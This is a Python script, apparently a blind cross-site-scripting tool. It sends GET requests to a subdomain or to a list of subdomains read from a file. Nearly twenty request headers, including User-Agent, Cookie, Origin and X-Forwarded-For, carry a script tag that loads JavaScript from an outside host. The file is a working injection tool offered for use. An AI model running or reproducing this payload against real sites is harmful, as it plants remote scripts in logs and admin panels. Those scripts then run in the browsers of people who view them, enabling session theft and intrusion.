import sys
import requests
from urllib.parse import urlparse

# Define the list of headers to include in the request
headers = {
    'User-Agent': '"><script/src=https://js.rip/0xmaruf></script>',
    'Origin': '"><script/src=https://js.rip/0xmaruf></script>',
    'Referrer': '"><script/src=https://js.rip/0xmaruf></script>',
    'Cookie': 'test="><script/src=https://js.rip/0xmaruf></script>',
    'X-Originating-IP': '"><script/src=https://js.rip/0xmaruf></script>',
    'X-Forwarded-For': '"><script/src=https://js.rip/0xmaruf></script>',
    'X-Forwarded': '"><script/src=https://js.rip/0xmaruf></script>',
    'Forwarded-For': '"><script/src=https://js.rip/0xmaruf></script>',
    'X-Forwarded-Host': '"><script/src=https://js.rip/0xmaruf></script>',
    'X-Remote-IP': '"><script/src=https://js.rip/0xmaruf></script>',
    'X-Remote-Addr': '"><script/src=https://js.rip/0xmaruf></script>',
    'X-ProxyUser-Ip': '"><script/src=https://js.rip/0xmaruf></script>',
    'X-Original-URL': '"><script/src=https://js.rip/0xmaruf></script>',
    'Client-IP': '"><script/src=https://js.rip/0xmaruf></script>',
    'X-Client-IP': '"><script/src=https://js.rip/0xmaruf></script>',
    'X-Host': '"><script/src=https://js.rip/0xmaruf></script>',
    'True-Client-IP': '"><script/src=https://js.rip/0xmaruf></script>',
    'Cluster-Client-IP': '"><script/src=https://js.rip/0xmaruf></script>',
    'X-Rewrite-URL': '"><script/src=https://js.rip/0xmaruf></script>'
}

def send_request(subdomain):
    try:
        # Check if the input starts with '/' indicating a local file path
        if subdomain.startswith('/'):
            with open(subdomain, "r") as file:
                lines = file.read().splitlines()
                for line in lines:
                    send_request(line)
        else:
            # Check if the input is a valid URL
            parsed_url = urlparse(subdomain)
            if parsed_url.scheme and parsed_url.netloc:
                url = subdomain
            else:
                url = f"http://{subdomain}"

            response = requests.get(url, headers=headers)
            if response.status_code == 200:
                print(f"Subdomain: {url} - Request Successful")
            else:
                print(f"Subdomain: {url} - Request Failed (Status Code: {response.status_code})")
    except FileNotFoundError:
        print(f"File not found: {subdomain}")
    except requests.exceptions.RequestException as e:
        print(f"Subdomain: {subdomain} - Request Failed: {str(e)}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python tool.py <subdomain or file_path>")
        sys.exit(1)

    input_path = sys.argv[1]
    send_request(input_path)
